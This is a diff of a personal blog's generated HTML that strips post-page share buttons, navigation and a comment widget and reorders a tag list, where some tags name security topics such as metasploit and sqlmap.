-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
         </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://blog.jbyusk.com/2018/10/24/暴雷漏洞分析/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
-  
-<nav id="article-nav">
-  
-    <a href="/2018/10/24/exploit3/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          (no title)
-        
-      </div>
-    </a>
   
   
-    <a href="/2018/10/24/Windbg之Mona2/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Windbg之Mona2</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-  
-  <!-- UY BEGIN -->
-<div id="uyan_frame"></div>
-<script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2159376"></script>
-<!-- UY END --> 
-  
-  
-  
-  
+    </div></section>
   
 
-  
-
-  
-
-  
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
+    
 
 
           </div>
@@ -403,9 +235,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: true,
+		isPost: false,
 		isArchive: false,
-		isTag: false,
+		isTag: true,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
@@ -465,7 +297,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">C++</a>
+                <a href="javascript:void(0)" class="js-tag color1">linux</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">汇编</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">内核编程</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">HOOK技术</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -473,7 +317,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">汇编</a>
+                <a href="javascript:void(0)" class="js-tag color4">C++</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -485,7 +329,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">python</a>
+                <a href="javascript:void(0)" class="js-tag color4">git</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -493,31 +337,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">git</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">vsfptd</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">linux</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">metasploit渗透魔鬼训练营笔记</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">逆向</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">metasploit</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">加壳</a>
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -525,19 +345,27 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">vsfptd</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">metasploit</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">逆向</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">加壳</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">sqlmap</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">HOOK技术</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">内核编程</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">笔记</a>
+                <a href="javascript:void(0)" class="js-tag color1">Window内核编程</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -545,15 +373,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">笔记</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">思考</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">心理学</a>
+                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
+                <a href="javascript:void(0)" class="js-tag color4">心理学</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -570,6 +402,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">深入理解计算机系统</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">网络协议</a>
               </li>
              
               <li class="article-tag-list-item">
